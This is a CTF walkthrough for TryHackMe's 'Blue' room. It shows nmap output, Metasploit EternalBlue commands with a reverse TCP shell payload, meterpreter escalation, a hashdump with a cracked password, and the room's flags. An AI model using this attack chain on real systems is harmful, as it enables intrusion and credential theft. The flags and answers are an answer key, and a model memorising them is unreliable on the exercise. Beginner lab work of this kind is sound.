Targets# THM - Blue

[TryHackMe | Blue](https://tryhackme.com/room/blue)

> Michael Jack | 06/2022

---

## Task 1 - Recon

> Scan and learn what exploit this machine is vulnerable to. 
> Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. 
> **This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. 
> Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**

*The VM used can be dowqnlaoded for offline usage from*: https://darkstar7471.com/resources.html

IP Address:
```
10.10.77.198
```

### Questions

> How many ports are open with a port number under 1000?

```shell
Scanned at 2022-06-06 16:00:48 EDT for 108s  
Not shown: 991 closed tcp ports (conn-refused)  
PORT      STATE SERVICE            VERSION  
135/tcp   open  msrpc              Microsoft Windows RPC  
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
3389/tcp  open  ssl/ms-wbt-server?  
|_ssl-date: 2022-06-06T20:02:36+00:00; 0s from scanner time.  
| rdp-ntlm-info:    
|   Target_Name: JON-PC  
|   NetBIOS_Domain_Name: JON-PC  
|   NetBIOS_Computer_Name: JON-PC  
|   DNS_Domain_Name: Jon-PC  
|   DNS_Computer_Name: Jon-PC  
|   Product_Version: 6.1.7601  
|_  System_Time: 2022-06-06T20:02:31+00:00  
| ssl-cert: Subject: commonName=Jon-PC  
| Issuer: commonName=Jon-PC  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha1WithRSAEncryption  
| Not valid before: 2022-06-05T19:57:22  
| Not valid after:  2022-12-05T19:57:22  
| MD5:   b06f b883 a9e0 ddaa bf98 3f42 b5bc 26c2  
| SHA-1: 2700 8936 3e73 e8d0 3d26 cbaa d6f8 63f3 d29d da0c  
| -----BEGIN CERTIFICATE-----  
| MIIC0DCCAbigAwIBAgIQPsoBqRpmRK5HfI4AVbs9ojANBgkqhkiG9w0BAQUFADAR  
| MQ8wDQYDVQQDEwZKb24tUEMwHhcNMjIwNjA1MTk1NzIyWhcNMjIxMjA1MTk1NzIy  
| WjARMQ8wDQYDVQQDEwZKb24tUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK  
| AoIBAQCgGNEzOli/s4NFWIPBnEsZ+5s101TK9SgM2P9xs/FQkhLezZyosJLHbHkD  
| tQXXn94+YywryNMNAumuKVlc8sHoMPpL1ZMbLoAdzlCOO2wlE/Rj30X7GAjDJg5m  
| 7h+4lMPbcLAlnZ8a9e7tn4iAyzDVW4os6muHWIq43NnQ5QBFOUEbAk8ssYc0gT0S  
| CEcd1U/esJCNLUpbKc3macK8MmTzUTDjs6NG+X1plMPLVEnuEZ1XerjMYy3NV9Ej  
| 45gwc9RkYaNxONy2xoGX/G8By4j8rhnZpv7lq/m/t8wxfX1QWyMrNEWcpyvvoFI0  
| UhpbUFki4ucOJVm3cskm4xUNXss9AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF  
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAjw4RntThlC5jmQwm  
| ZidrYWZYchyUZehpdrEhmywNT3yvYSe0viFBXmRZ/vlLrEf9oYJtdynGy1GAHkMR  
| 9oS2Mf6tU60W0bmydvQM+HUZXJJwcGqV23eK54t7Eou0h93rwbB6GdIYYbgPMAQQ  
| H6pNpNycOR4iaYvbqqvy5CqDymZSnS2YO6Fkir8g2qh3JKpVucbW5wAXOxfCgIds  
| ddWhKgyEckIibe/bJ8zonWq4GTe1xdm0FzGRc/lHlQefViRGcP1iXXu27r8ua7+B  
| LWbUHcGSpnH34dYuDVQ+fT42NsYpIFj6pn/01pqEuGwjiNIeufKezlQoAHHjAIMj  
| B5iYBg==  
|_-----END CERTIFICATE-----  
49152/tcp open  msrpc              Microsoft Windows RPC  
49153/tcp open  msrpc              Microsoft Windows RPC  
49154/tcp open  msrpc              Microsoft Windows RPC  
49158/tcp open  msrpc              Microsoft Windows RPC  
49160/tcp open  msrpc              Microsoft Windows RPC  
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s  
| p2p-conficker:    
|   Checking for Conficker.C or higher...  
|   Check 1 (port 63387/tcp): CLEAN (Couldn't connect)  
|   Check 2 (port 49473/tcp): CLEAN (Couldn't connect)  
|   Check 3 (port 39524/udp): CLEAN (Failed to receive data)  
|   Check 4 (port 48161/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:41:9f:63:6a:33 (unknown)  
| smb-os-discovery:    
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)  
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional  
|   Computer name: Jon-PC  
|   NetBIOS computer name: JON-PC\x00  
|   Workgroup: WORKGROUP\x00  
|_  System time: 2022-06-06T15:02:31-05:00  
| smb2-security-mode:    
|   2.1:    
|_    Message signing enabled but not required  
| smb-security-mode:    
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  
| smb2-time:    
|   date: 2022-06-06T20:02:31  
|_  start_date: 2022-06-06T19:57:20
```

```
3
```

> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```shell
Host script results:  
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED  
| smb-vuln-ms17-010:    
|   VULNERABLE:  
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)  
|     State: VULNERABLE  
|     IDs:  CVE:CVE-2017-0143  
|     Risk factor: HIGH  
|       A critical remote code execution vulnerability exists in Microsoft SMBv1  
|        servers (ms17-010).  
|              
|     Disclosure date: 2017-03-14  
|     References:  
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/  
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143  
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  
|_smb-vuln-ms10-054: false  
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
```

```
MS17-010
```

---

## Task 2 - Gain Access

Exploit the machine and gain a foothold.

Start metasploit!
```shell
msfconsole
```

> Find the exploitation coded we will use. What is it's full path?

```
msf6 > search eternal blue
```

```
exploit/windows/smb/ms17_010_eternalblue
```

> Show options and set the one required value. What is the name of this value? (All caps for submission)

```
Module options (exploit/windows/smb/ms17_010_eternalblue):  
  
  Name           Current Setting  Required  Description  
  ----           ---------------  --------  -----------  
  RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit  
  RPORT          445              yes       The target port (TCP)  
  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windo  
                                            ws Embedded Standard 7 target machines.  
  SMBPass                         no        (Optional) The password for the specified username  
  SMBUser                         no        (Optional) The username to authenticate as  
  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows E  
                                            mbedded Standard 7 target machines.  
  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded St  
                                            andard 7 target machines.
```

```
set RHOSTS 10.10.77.198
```

```
RHOSTS
```

Run ```set payload windows/x64/shell/reverse_tcp``` before running the exploit to define the payload explicitly.

Error running exploit. Have not been able to get a session. Am now trying it locally.

Recommended alt payload ```set payload generic/shell_reverse_tcp```

Got new local lab IP.

```
10.38.1.113
```

It took forever but I finally got a shell!!

Not sure exactly what the fix was, but make sure:
- Target box is up
	- Restart if repeated attempts fail
- Make sure LHOST is set to your actual attack machines IP
- Make sure you have set the correct RHOSTS IP for you target machine

---

## Task 3 - Escalate

> If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

We can use the ```shell_to_meterpreter``` module to upgrade our shell.

We pick which shell to upgrade by running ```sessions -l``` and setting the id as the ```SESSION``` option on the module.

```
post/multi/manage/shell_to_meterpreter
```

> Select this (use MODULE_PATH). Show options, what option are we required to change?

```
SESSION
```

> Set the required option, you may need to list all of the sessions to find your target here.

> Run! If this doesn't work, try completing the exploit from the previous task once more.

> Once the meterpreter shell conversion completes, select that session for use.

> Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this.
> Feel free to open a dos shell via the command 'shell' and run 'whoami'. 
> This should return that we are indeed system. 
> Background this shell afterwards and select our meterpreter session for usage again.

> List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. 
> Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

```
380
```

> Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. 
> This may take several attempts, migrating processes is not very stable. 
> If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

---

## Task 4 - Cracking

Dump the non-default user's password and crack it!

> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

```
Jon
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

[CrackStation](https://crackstation.net/) can work as an easy online option. 
We just need to pass it the second half of it (from after the 3rd ```:``` to before the 3 at the end.)

```
alqfna22
```

---

## Task 5 - Get Flags

> Flag1? _This flag can be found at the system root._

Found in the C:/ directory

```
flag{access_the_machine}
```

> Flag2? _This flag can be found at the location where passwords are stored within Windows._
> Errata: Windows really doesn't like the location of this flag and can occasionally delete it. 
> It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

Found in the windows sam location
C:/WINDOWS/system32/config

```
flag{sam_database_elevated_access}
```

> flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

In meterpreter we can use "search" with the -f flag to search for a pattern like:

```
search -f flag*.txt
```

This shows us that flag3 is in c:/Users/Jon/Documents

```
flag{admin_documents_can_be_valuable}
```

---
